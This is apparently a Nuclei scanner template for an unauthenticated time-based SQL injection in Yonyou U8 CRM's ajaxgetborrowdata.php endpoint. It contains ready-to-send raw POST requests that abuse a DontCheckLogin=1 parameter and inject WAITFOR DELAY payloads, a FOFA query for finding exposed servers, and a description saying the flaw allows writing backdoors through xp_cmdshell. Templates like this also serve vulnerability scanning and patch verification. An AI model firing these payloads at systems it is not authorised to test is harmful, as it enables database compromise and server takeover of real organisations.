id: yongyouU8-CRM-ajaxgetborrowdata_php-sql-time-2

info:
  name: 用友U8 CRM /borrowout/ajaxgetborrowdata.php SQL注入漏洞
  author: Superhero
  severity: high
  description: |-
    fofa: title="用友U8CRM"
    用友 U8 CRM客户关系管理系统 /borrowout/ajaxgetborrowdata.php 文件多个方法存在SQL注入漏洞，未经身份验证的攻击者通过漏洞执行任意SQL语句，调用xp_cmdshell写入后门文件，执行任意代码，从而获取到服务器权限。
  reference:
    - https://mp.weixin.qq.com/s/fm4V-dgdJ2lweABilr8yLA?token=974751616&lang=zh_CN
  tags: sql injection


http:
  - raw:
      - |
        POST /borrowout/ajaxgetborrowdata.php?DontCheckLogin=1&Action=getCusInfo HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
        Cookie: PHPSESSID=bgsesstimeout-;
        Content-Type: application/x-www-form-urlencoded; charset=utf-8

        cus=1%27%3BWAITFOR+DELAY+%270%3A0%3A4%27--
      - |
        POST /borrowout/ajaxgetborrowdata.php?DontCheckLogin=1&Action=getCusInfo HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.41 Safari/537.36
        Cookie: PHPSESSID=bgsesstimeout-;
        Content-Type: application/x-www-form-urlencoded; charset=utf-8

        cus=1%27%3BWAITFOR+DELAY+%270%3A0%3A8%27--
    matchers:
      - type: dsl
        dsl:
          - 'duration_1>=4 && duration_1<=5'  
          - 'duration_2>=8 && duration_2<=9'
        condition: and
